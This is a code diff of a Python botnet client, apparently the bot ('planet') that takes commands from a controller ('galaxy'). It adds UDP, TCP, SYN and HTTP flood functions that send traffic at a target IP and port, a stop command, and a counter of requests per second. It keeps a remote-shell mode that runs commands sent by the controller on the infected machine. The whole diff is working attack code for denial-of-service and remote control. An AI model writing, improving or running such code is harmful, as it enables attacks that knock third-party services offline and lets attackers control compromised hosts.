@@ -10,8 +10,6 @@ import sys
 import random
 import subprocess
 import time
-import struct
-import datetime as dt
 
 # get platform
 if sys.platform in ('linux', 'linux2'):
@@ -30,84 +28,65 @@ def wait_for_threads():
     while open_threads > 0:
         time.sleep(0.1)
 
-def getRealTime():
-    ntp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    msg = '\x1b' + 47 * '\0'
-    ntp_socket.sendto(msg.encode(), ("pool.ntp.org", 123))
-    msg, _ = ntp_socket.recvfrom(1024)
-    t = int(struct.unpack("!12I", msg)[10]) - 2208988800
-    time_new = dt.datetime.fromtimestamp(t)
-    return time_new.strftime("hours: %H minutes: %M seconds: %S")
+def ddos_udp():
+    global open_threads, requests_sent
+    while planet_attacking:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect((str(target_ip), int(target_port)))
+            s.sendto(os.urandom(1024), (str(target_ip), int(target_port)))
+            s.close()
+            requests_sent += 1
+        except IOError:
+            time.sleep(10)
+    open_threads -= 1
 
-def ddos():
-    global planet_attacking, open_threads
-    if flood_type == "tcp":
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        bytes = random._urandom(10240)
-        s.connect((str(target_ip), int(target_port)))
-        while planet_attacking:
-            try:
-                s.send(bytes)
-            except IOError as e:
-                if not planet_attacking:
-                    break
-                elif str(e) in ("[Errno 110] Connection timed out", "[Errno 32] Broken pipe", "[Errno 104] Connection reset by peer"):
-                    continue
-                elif str(e) == "[Errno 111] Connection refused":
-                    print("Target is offline, stopping attack...")
-                    planet_attacking = False
-                    break
-                else:
-                    print("An error occurred.")
-                    print(e)
-                    break
-    elif flood_type == "udp":
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(10240)
-        s.connect((str(target_ip), int(target_port)))
-        while planet_attacking:
-            try:
-                s.send(bytes)
-            except IOError as e:
-                if not planet_attacking:
-                    break
-                elif str(e) in ("[Errno 110] Connection timed out", "[Errno 32] Broken pipe", "[Errno 104] Connection reset by peer"):
-                    continue
-                elif str(e) == "[Errno 111] Connection refused":
-                    print("Target is offline, stopping attack...")
-                    planet_attacking = False
-                    break
-                else:
-                    print("An error occurred.")
-                    print(e)
-                    break
-    else:
-        src_ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((str(target_ip), int(target_port)))
-        while planet_attacking:
-            try:
-                s.send(("GET /" + str(target_ip) + "HTTP/1.1\r\n").encode('ascii'))
-                s.send(("Host: " + str(src_ip) + "\r\n\r\n").encode('ascii'))
-            except IOError as e:
-                if not planet_attacking:
-                    break
-                elif str(e) in ("[Errno 110] Connection timed out", "[Errno 32] Broken pipe", "[Errno 104] Connection reset by peer"):
-                    continue
-                elif str(e) == "[Errno 111] Connection refused":
-                    print("Target is offline, stopping attack...")
-                    planet_attacking = False
-                    break
-                else:
-                    print("An error occurred.")
-                    print(e)
-                    break
+def ddos_tcp():
+    global open_threads, requests_sent
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while planet_attacking:
+        try:
+            s.connect((str(target_ip), int(target_port)))
+            s.setblocking(0)
+            s.sendto(random._urandom(10240), (str(target_ip), int(target_port)))
+            requests_sent += 1
+        except IOError as e:
+            time.sleep(10)
     if "s" in locals():
         s.close()
     open_threads -= 1
 
+def ddos_syn():
+    global open_threads, requests_sent
+    while planet_attacking:
+        try:
+            s = socket.socket()
+            s.connect((str(target_ip), int(target_port)))
+            s.close()
+            requests_sent += 1
+        except IOError:
+            time.sleep(10)
+    if "s" in locals():
+        s.close()
+    open_threads -= 1
+
+def ddos_http():
+    global open_threads, requests_sent
+    src_ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+    while planet_attacking:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(target_ip), int(target_port)))
+            s.sendto((f"GET /{target_ip} HTTP/1.1\r\n").encode('ascii'), (str(target_ip), int(target_port)))
+            s.sendto((f"Host: {src_ip} \r\n\r\n").encode('ascii'), (str(target_ip), int(target_port)))
+            s.close()
+            requests_sent += 1
+        except IOError:
+            time.sleep(10)
+    open_threads -= 1
+
 def exit_handler(sig, frame):
-    global planet_online, planet_shutting_down
+    global planet_online, planet_shutting_down, planet_attacking, planet_shelled
     planet_shutting_down = True
     if planet_online:
         planet_socket.send(f"planet ID: {planet_id} offline".encode())
@@ -151,9 +130,9 @@ def shell():
             shell_cmds = shell_cmd.split(";")
         elif "&&" in shell_cmd and ";" in shell_cmd:
             shell_cmds = shell_cmd.split("&&")
-            for i, possibleCMD in enumerate(shell_cmds):
-                if ";" in possibleCMD:
-                    shell_cmds[i] = possibleCMD.split(";")
+            for i, possible_cmd in enumerate(shell_cmds):
+                if ";" in possible_cmd:
+                    shell_cmds[i] = possible_cmd.split(";")
         if not shell_cmds:
             if shell_cmd[:2].lower() == "cd":
                 new_shell_cmd = shell_cmd.replace("cd ", "", 1).strip()
@@ -190,11 +169,17 @@ def connection_handler():
         while planet_online:
             try:
                 data = planet_socket.recv(1024).decode("ascii").lower()
+                print(data)
                 if "ddos" in data:
-                    print("Recieved DDoS command.")
                     data = data.replace("ddos ", "").strip().split()
+                    if "stop" in data:
+                        print("Recieved stop DDoS command.")
+                        planet_attacking = False
+                        continue
+                    else:
+                        print("Recieved DDoS command.")
                     target_ip, target_port, flood_type = data
-                    attack_thread_count = int(planet_threads) * 128
+                    attack_thread_count = int(planet_threads) * 2
                     if planet_os == "windows":
                         system_limits = int(ctypes.windll.msvcrt._getmaxstdio())
                     else:
@@ -202,29 +187,51 @@ def connection_handler():
                     if attack_thread_count >= system_limits:
                         attack_thread_count = system_limits - 128
                     planet_attacking = True
-                    for _ in range(attack_thread_count):
-                        thread = threading.Thread(target=ddos)
-                        thread.start()
-                        open_threads += 1
+                    threading.Thread(target=ddos_check_reqs).start()
+                    if flood_type == "udp":
+                        for _ in range(attack_thread_count):
+                            threading.Thread(target=ddos_udp).start()
+                            open_threads += 1
+                    elif flood_type == "http":
+                        for _ in range(attack_thread_count):
+                            threading.Thread(target=ddos_http).start()
+                            open_threads += 1
+                    elif flood_type == "syn":
+                        for _ in range(attack_thread_count):
+                            threading.Thread(target=ddos_syn).start()
+                            open_threads += 1
+                    else:
+                        for _ in range(attack_thread_count):
+                            threading.Thread(target=ddos_tcp).start()
+                            open_threads += 1
                     planet_socket.send(f"planet ID: {planet_id} attacking".encode())
                     print(f"Attacking! (IP: {target_ip} | Port: {target_port} | Type: {flood_type} flood)")
                 elif "planet ID: " in data:
                     planet_id = data.replace("planet ID: ", "").strip()
+                    print(f"Recieved planet ID: {planet_id}")
+                    print(data)
                 elif "shellcmd start bufsize " in data:
                     shell_buf_size = int(data.replace("shellcmd start bufsize ", "").strip())
                     planet_shelled = True
                     planet_socket.send(f"planet ID: {planet_id} shelled".encode())
                     shell()
-            #except Exception as e:
-            #    print("Having trouble from galaxy, attempting to reconnect...")
-            #    planet_online = False
-            #    connect_to_galaxy()
+            except Exception:
+                print("Having trouble connecting to galaxy, attempting to reconnect...")
+                planet_online = False
+                connect_to_galaxy()
             except IOError as e:
                 print(e)
             time.sleep(1)
         planet_attacking = False
         planet_shelled = False
-    open_threads -= 1
+
+def ddos_check_reqs():
+    while planet_attacking:
+        old_requests_sent = requests_sent
+        time.sleep(5)
+        requests_sent_5_sec = requests_sent - old_requests_sent
+        requests_sent_1_sec = requests_sent_5_sec / 5
+        print(f"Requests Per Second: {requests_sent_1_sec}")
 
 # exit handler
 signal(SIGINT, exit_handler)
@@ -244,9 +251,11 @@ planet_shelled = False
 planet_attacking = False
 planet_online = False
 planet_shutting_down = False
+attack_socket = ""
+tcp_ddos_packet = ""
+requests_sent = 0
 
 # connect to galaxy
 connect_to_galaxy()
 connection_handler_thread = threading.Thread(target=connection_handler)
 connection_handler_thread.start()
-open_threads += 1
